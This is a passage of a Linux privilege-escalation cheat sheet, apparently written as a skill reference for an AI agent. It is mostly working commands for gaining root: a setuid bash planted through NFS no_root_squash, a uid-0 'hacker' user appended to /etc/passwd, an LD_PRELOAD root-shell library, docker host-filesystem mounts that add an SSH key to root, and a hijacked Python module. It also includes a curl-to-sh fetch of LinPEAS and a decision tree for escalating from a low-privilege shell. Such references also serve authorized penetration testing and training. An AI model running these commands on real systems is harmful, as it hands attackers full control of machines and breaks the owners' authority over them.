# linux-privilege-escalation technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 5. NFS NO_ROOT_SQUASH

```bash
# On attacker: check exported shares
showmount -e TARGET_IP

# If no_root_squash is set:
mount -t nfs TARGET_IP:/share /mnt/nfs
# As root on attacker box:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target:
/share/bash -p    # root shell
```

---

## 6. WRITABLE /etc/passwd OR /etc/shadow

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123
# → $1$xyz$...hash...

# Append root-equivalent user
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Or replace root's 'x' with generated hash (if no shadow file)
```

### Writable /etc/shadow

```bash
# Generate SHA-512 hash
mkpasswd -m sha-512 password123

# Replace root's hash in /etc/shadow
```

---

## 7. LD_PRELOAD / LD_LIBRARY_PATH WITH SUDO

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
# Compile .so with _init() that calls setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER GROUP → ROOT

```bash
# If current user is in the docker group:
id    # check for "docker" in groups

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or add SSH key
docker run -v /root:/mnt --rm -it alpine sh -c \
  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
```

---

## 9. PYTHON / PERL / RUBY LIBRARY HIJACKING

```bash
# Python: if a root-executed script does "import somelib"
# Check python path order:
python3 -c 'import sys; print("\n".join(sys.path))'

# Place malicious module in writable path that comes first:
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF

# Perl: PERL5LIB / @INC manipulation
# Ruby: RUBYLIB / $LOAD_PATH manipulation
```

---

## 10. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **LinPEAS** | Comprehensive enumeration | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **linux-exploit-suggester** | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| **pspy** | Monitor processes (no root needed) | `./pspy64` |
| **LinEnum** | Legacy enumeration | `./LinEnum.sh -t` |
| **GTFOBins** | SUID/sudo/capability abuse reference | https://gtfobins.github.io/ |

---

## 11. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell obtained
│
├── sudo -l shows entries?
│   ├── GTFOBins match? → exploit directly
│   ├── env_keep has LD_PRELOAD? → LD_PRELOAD hijack (§7)
│   ├── NOPASSWD on custom script? → review script for injection
│   └── (ALL) with password? → check for password reuse/hashes
│
├── SUID/SGID binaries found?
│   ├── Standard binary on GTFOBins? → SUID exploit (§2)
│   ├── Custom binary? → reverse engineer, check libs (strace/ltrace)
│   └── Shared lib from writable path? → library hijack (§2)
│
├── Capabilities on binaries?
│   ├── cap_setuid? → instant root (§3)
│   ├── cap_dac_override? → write /etc/passwd (§6)
│   ├── cap_sys_admin? → mount / namespace tricks
│   └── cap_sys_ptrace? → process injection
│
├── Cron jobs running as root?
│   ├── Writable script? → inject payload (§4)
│   ├── Missing full path? → PATH hijack (§4)
│   └── Uses wildcards? → wildcard injection (§4)
│
├── Writable sensitive files?
│   ├── /etc/passwd writable? → add root user (§6)
│   ├── /etc/shadow writable? → replace root hash (§6)
│   └── systemd unit files writable? → add ExecStartPre
│
├── Docker/LXD group membership?
│   └── Yes → mount host filesystem (§8)
│
├── NFS shares with no_root_squash?
│   └── Yes → SUID binary via NFS (§5)
│
├── Kernel version old/unpatched?
│   └── Check KERNEL_EXPLOITS_CHECKLIST.md
│
└── None of the above?
    ├── Run LinPEAS for comprehensive scan
    ├── Check for password reuse (bash_history, config files)
    ├── Check internal services (127.0.0.1 listeners)
    └── Monitor processes with pspy for hidden opportunities
```
